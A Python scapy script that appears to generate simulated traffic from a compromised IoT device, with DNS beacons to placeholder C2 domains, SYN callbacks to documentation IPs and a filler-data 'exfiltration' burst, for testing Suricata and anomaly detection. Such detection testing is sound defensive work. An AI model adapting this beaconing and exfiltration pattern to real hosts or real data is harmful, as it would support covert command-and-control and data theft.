#!/usr/bin/env python3
"""
Simulates a compromised IoT device beaconing to a C2 server.
Pattern: periodic DNS lookups + HTTP callbacks to suspicious domains.
Detection: Suricata rules + NPU should flag periodic external connections.
"""
from scapy.all import *
import time
import sys
import random

C2_DOMAINS = [
    "evil-botnet-c2.example.com",
    "update-firmware.malware.test",
    "cdn-analytics.bad-actor.test",
]
C2_IPS = ["198.51.100.1", "203.0.113.50", "192.0.2.100"]  # RFC5737 safe test IPs

def dns_beacon(target_dns="127.0.0.1", count=20, interval=3):
    print(f"[C2 Beacon] DNS lookups every {interval}s ({count} total)")
    for i in range(count):
        domain = random.choice(C2_DOMAINS)
        pkt = IP(dst=target_dns)/UDP(dport=53)/DNS(
            rd=1, qd=DNSQR(qname=domain, qtype="A")
        )
        send(pkt, verbose=False)
        print(f"  [{i+1}/{count}] DNS query: {domain}")
        time.sleep(interval)

def http_beacon(count=10, interval=5):
    print(f"\n[C2 Beacon] HTTP callbacks every {interval}s ({count} total)")
    for i in range(count):
        c2_ip = random.choice(C2_IPS)
        pkt = IP(dst=c2_ip)/TCP(dport=80, flags="S")
        send(pkt, verbose=False)
        pkt2 = IP(dst=c2_ip)/TCP(dport=443, flags="S")
        send(pkt2, verbose=False)
        print(f"  [{i+1}/{count}] Beacon -> {c2_ip}:80,443")
        time.sleep(interval)

def exfil_burst(target_ip="198.51.100.1", size_kb=100):
    print(f"\n[Exfiltration] Sending {size_kb}KB burst -> {target_ip}")
    payload = Raw(load="X" * 1024)
    packets = [IP(dst=target_ip)/TCP(dport=443, flags="PA")/payload for _ in range(size_kb)]
    send(packets, verbose=False)
    print(f"  Sent {size_kb} packets ({size_kb}KB total)")

if __name__ == '__main__':
    print("=== C2 Beacon Simulation ===")
    print("(Simulating compromised IoT device calling home)\n")
    mode = sys.argv[1] if len(sys.argv) > 1 else "all"
    if mode in ("dns", "all"):
        dns_beacon(count=10, interval=2)
    if mode in ("http", "all"):
        http_beacon(count=5, interval=3)
    if mode in ("exfil", "all"):
        exfil_burst(size_kb=50)
    print("\n=== C2 simulation complete ===")
